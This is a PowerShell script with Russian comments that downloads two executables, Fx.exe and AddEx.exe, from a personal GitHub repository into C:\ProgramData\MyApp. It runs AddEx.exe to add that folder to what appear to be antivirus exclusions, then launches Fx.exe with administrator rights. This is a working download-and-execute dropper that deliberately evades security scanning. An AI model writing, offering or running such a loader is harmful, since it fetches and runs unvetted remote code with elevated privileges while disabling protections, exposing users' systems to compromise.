# ===============================================
# СКРИПТ: РАБОТАЕТ С ТВОЕЙ ПАПКОЙ C:\ProgramData\MyApp
# Версия: ИДЕАЛЬНАЯ
# ===============================================

# -------------------------------------------------
# 1. КОНСТАНТЫ - ТОЛЬКО ТВОИ ПУТИ
# -------------------------------------------------
$URL_FX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe"
$URL_ADDEX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/AddEx.exe"
$TARGET_DIR = "C:\ProgramData\MyApp"  # ТВОЯ ПАПКА
$FX_PATH = "$TARGET_DIR\Fx.exe"
$ADDEX_PATH = "$TARGET_DIR\AddEx.exe"

# -------------------------------------------------
# 2. ПОДГОТОВКА ТВОЕЙ ПАПКИ
# -------------------------------------------------
Write-Host "[1/5] Проверяю твою папку: $TARGET_DIR" -ForegroundColor Cyan
if (-not (Test-Path $TARGET_DIR)) {
    New-Item -ItemType Directory -Path $TARGET_DIR -Force | Out-Null
    Write-Host "      Папка создана." -ForegroundColor Green
} else {
    Write-Host "      Папка существует." -ForegroundColor Green
}

# -------------------------------------------------
# 3. КАЧАЕМ FX.EXE В ТВОЮ ПАПКУ
# -------------------------------------------------
Write-Host "[2/5] Качаю Fx.exe в твою папку..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $URL_FX -OutFile $FX_PATH -ErrorAction Stop
    Write-Host "      Успех: $FX_PATH" -ForegroundColor Green
} catch {
    Write-Host "      ОШИБКА: $_" -ForegroundColor Red
    exit 1
}

if (-not (Test-Path $FX_PATH)) {
    Write-Host "      ПИЗДЕЦ: файл Fx.exe не найден после скачивания." -ForegroundColor Red
    exit 1
}

# -------------------------------------------------
# 4. КАЧАЕМ ADDEX.EXE В ТВОЮ ПАПКУ
# -------------------------------------------------
Write-Host "[3/5] Качаю AddEx.exe в твою папку..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $URL_ADDEX -OutFile $ADDEX_PATH -ErrorAction Stop
    Write-Host "      Успех: $ADDEX_PATH" -ForegroundColor Green
} catch {
    Write-Host "      ОШИБКА: $_" -ForegroundColor Red
    Write-Host "      Продолжаю без AddEx.exe" -ForegroundColor Yellow
}

# -------------------------------------------------
# 5. ЗАПУСКАЕМ ADDEX.EXE (ОН ДОБАВИТ ТВОЮ ПАПКУ В ИСКЛЮЧЕНИЯ)
# -------------------------------------------------
if (Test-Path $ADDEX_PATH) {
    Write-Host "[4/5] Запускаю AddEx.exe для добавления ТВОЕЙ ПАПКИ в исключения..." -ForegroundColor Cyan
    try {
        Start-Process -FilePath $ADDEX_PATH -Wait
        Write-Host "      AddEx.exe отработал. Твоя папка теперь в исключениях." -ForegroundColor Green
    } catch {
        Write-Host "      Не удалось запустить AddEx.exe: $_" -ForegroundColor Red
    }
} else {
    Write-Host "[4/5] Пропускаю: AddEx.exe не найден." -ForegroundColor Yellow
}

# -------------------------------------------------
# 6. ЗАПУСКАЕМ FX.EXE ОТ АДМИНИСТРАТОРА
# -------------------------------------------------
Write-Host "[5/5] Запускаю Fx.exe из ТВОЕЙ ПАПКИ от имени администратора..." -ForegroundColor Cyan
try {
    Start-Process -FilePath $FX_PATH -Verb RunAs
    Write-Host "      Fx.exe запущен. Твоя папка в исключениях - должен работать." -ForegroundColor Green
} catch {
    Write-Host "      Не удалось запустить Fx.exe: $_" -ForegroundColor Red
}

# -------------------------------------------------
# 7. ВСЁ
# -------------------------------------------------
Write-Host "`nГОТОВО. Всё в твоей папке C:\ProgramData\MyApp" -ForegroundColor Cyan
Write-Host "Окно закроется через 5 секунд." -ForegroundColor Gray
Start-Sleep -Seconds 5
